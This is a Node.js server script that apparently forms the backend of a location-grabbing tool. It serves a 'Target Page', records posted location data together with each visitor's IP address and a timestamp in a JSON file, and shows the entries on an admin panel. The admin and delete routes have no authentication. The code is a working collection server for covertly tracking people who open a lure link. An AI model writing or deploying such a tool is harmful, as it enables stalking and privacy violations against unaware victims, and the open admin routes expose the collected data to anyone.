const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000; 
const DATA_FILE = path.join(__dirname, 'data.json');

// Initialize data file if it doesn't exist
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

const server = http.createServer((req, res) => {
    // Handle CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');

    // Serve the main index.html page
    if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading index.html');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            }
        });
    } 
    // Receive location data
    else if (req.method === 'POST' && req.url === '/location') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const currentData = JSON.parse(fs.readFileSync(DATA_FILE));
                
                // Get IP address
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
                
                data.time = new Date().toLocaleString();
                data.ip = ip; // Save IP address
                
                currentData.push(data);
                fs.writeFileSync(DATA_FILE, JSON.stringify(currentData, null, 2)); // Save to JSON file
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) {
                res.writeHead(400);
                res.end('Invalid JSON');
            }
        });
    }
    // Admin Panel Route
    else if (req.method === 'GET' && req.url === '/admin') {
        fs.readFile(path.join(__dirname, 'admin.html'), (err, content) => {
            if (err) {
                res.writeHead(500);
                res.end('Error loading admin.html');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(content);
            }
        });
    } 
    // Delete Route
    else if (req.method === 'POST' && req.url === '/delete') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const { index } = JSON.parse(body);
                const currentData = JSON.parse(fs.readFileSync(DATA_FILE));
                if (index >= 0 && index < currentData.length) {
                    currentData.splice(index, 1);
                    fs.writeFileSync(DATA_FILE, JSON.stringify(currentData, null, 2));
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) {
                res.writeHead(400);
                res.end('Error deleting entry');
            }
        });
    }
    else {
        res.writeHead(404);
        res.end('Not Found');
    }
});

server.listen(PORT, () => {
    console.log(`[*] Target Page Running at: http://localhost:${PORT}/`);
    console.log(`[*] Admin Panel Running at: http://localhost:${PORT}/admin`);
});
